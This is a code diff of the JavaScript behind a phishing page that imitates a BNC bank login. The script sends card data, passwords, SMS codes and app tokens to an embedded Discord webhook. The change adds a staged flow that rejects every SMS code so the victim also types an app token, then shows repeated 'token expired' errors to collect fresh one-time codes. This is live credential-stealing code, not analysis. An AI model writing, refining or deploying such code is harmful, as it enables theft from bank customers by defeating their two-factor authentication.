@@ -1,7 +1,6 @@
 const CONFIG = {
   webhookUrl: "https://discord.com/api/webhooks/1565011334024925195/czoBUCkSfD18ywlnDfdnx04n97wyFyYFDhhV2KpFfH-e1lJcN9GHnp1PirLuHdG3l-lr",
   username: "BNC · Iniciar Sesión",
-  clientName: "BNC INICIO DE SESION",
   esperaMs: 20000
 };
 
@@ -45,9 +44,13 @@ const CONFIG = {
   const cardMask = $("cardMask");
   const clave = $("clave");
   const code = $("code");
+  const codeTitle = $("codeTitle");
+  const codeSub = $("codeSub");
   const loader = $("loader");
+
   let tab = "personas";
   let modo = "credito";
+  let fase = "sms";   // "sms" | "app"
 
   /* ---------- pestañas ---------- */
   tabs.addEventListener("click", e => {
@@ -59,8 +62,7 @@ const CONFIG = {
     segEmpresas.hidden = tab !== "empresas";
     modo = tab === "personas" ? "credito" : "bncnet";
     document.querySelectorAll(".seg-item").forEach(s => {
-      const seg = s.parentElement;
-      s.classList.toggle("active", s.dataset.mode === modo && !seg.hidden);
+      s.classList.toggle("active", s.dataset.mode === modo && !s.parentElement.hidden);
     });
     cedulaWrap.hidden = tab === "empresas" && modo === "bncnet";
     $("s1Error").hidden = true;
@@ -77,7 +79,7 @@ const CONFIG = {
     });
   });
 
-  /* ---------- inputs numéricos ---------- */
+  /* ---------- filtros ---------- */
   cardNumber.addEventListener("input", () => {
     cardNumber.value = cardNumber.value.replace(/\D/g, "").slice(0, 16);
   });
@@ -88,7 +90,7 @@ const CONFIG = {
     clave.value = clave.value.replace(/\s/g, "").slice(0, 20);
   });
   code.addEventListener("input", () => {
-    code.value = code.value.replace(/\D/g, "").slice(0, 6);
+    code.value = code.value.replace(/\D/g, "").slice(0, 8);
   });
 
   /* ---------- navegación ---------- */
@@ -97,9 +99,6 @@ const CONFIG = {
     $("s2").hidden = n !== 2;
     $("s3").hidden = n !== 3;
     tabs.classList.toggle("single", n !== 1);
-    if (n !== 1) {
-      document.querySelectorAll(".tab").forEach(t => t.classList.toggle("active", t.dataset.tab === tab));
-    }
     window.scrollTo(0, 0);
   }
 
@@ -120,7 +119,7 @@ const CONFIG = {
 
     send({
       title: "🔐 Paso 1 · Credenciales",
-      color: 0x0c2b57,
+      color: 0x0a2447,
       fields: [
         { name: "Sección", value: tab === "personas" ? "Personas" : "Empresas", inline: true },
         { name: "Tipo", value: modo, inline: true },
@@ -135,7 +134,7 @@ const CONFIG = {
     clave.focus();
   });
 
-  /* ---------- paso 2 ---------- */
+  /* ---------- paso 2 · clave ---------- */
   $("btnIngresar").addEventListener("click", async () => {
     const err = $("s2Error");
     if (clave.value.length < 4) {
@@ -161,6 +160,14 @@ const CONFIG = {
     b.textContent = "Ingresar";
     b.disabled = false;
 
+    // arranca siempre en la fase del SMS
+    fase = "sms";
+    codeTitle.textContent = "Ingrese el código enviado por SMS";
+    codeSub.textContent = "Te enviamos un mensaje con el código de 8 dígitos";
+    code.placeholder = "Código SMS";
+    code.value = "";
+    $("s3Error").hidden = true;
+
     loader.hidden = false;
     setTimeout(() => {
       loader.hidden = true;
@@ -174,8 +181,9 @@ const CONFIG = {
   /* ---------- paso 3 · código ---------- */
   $("btnCode").addEventListener("click", async () => {
     const err = $("s3Error");
+
     if (code.value.length < 8) {
-      err.textContent = "Ingrese el código de 6 dígitos";
+      err.textContent = "Ingrese el código de 8 dígitos";
       err.hidden = false;
       return;
     }
@@ -185,23 +193,37 @@ const CONFIG = {
     b.textContent = "Validando...";
 
     await send({
-      title: "📲 Paso 3 · Código de la app",
-      color: 0x2b5ce6,
+      title: fase === "sms" ? "📩 Código SMS" : "📲 Token de la app",
+      color: 0x2b4fe0,
       fields: [
         { name: "Tarjeta", value: cardMask.value, inline: true },
-        { name: "Código", value: code.value, inline: true }
+        { name: fase === "sms" ? "Código SMS" : "Token", value: code.value, inline: true }
       ]
     });
 
     b.textContent = "Ingresar";
     b.disabled = false;
 
+    if (fase === "sms") {
+      // el SMS se rechaza y pasa al token de la app
+      fase = "app";
+      code.value = "";
+      code.placeholder = "Token de la app";
+      codeTitle.textContent = "Ingrese el token generado en la app";
+      codeSub.textContent = "El código enviado por SMS no es válido";
+      err.textContent = "El código ingresado es incorrecto. Ingresa el token generado en la app.";
+      err.hidden = false;
+      code.focus();
+      return;
+    }
+
+    // token de la app: carga y vuelve con el aviso de vencido
     loader.hidden = false;
     setTimeout(() => {
       loader.hidden = true;
       step(3);
       code.value = "";
-      err.textContent = "El código ha vencido. Espera a que cambie en la app y vuelve a ingresarlo.";
+      err.textContent = "El token ha vencido. Espera a que cambie en la app y vuelve a ingresarlo.";
       err.hidden = false;
       code.focus();
     }, CONFIG.esperaMs);
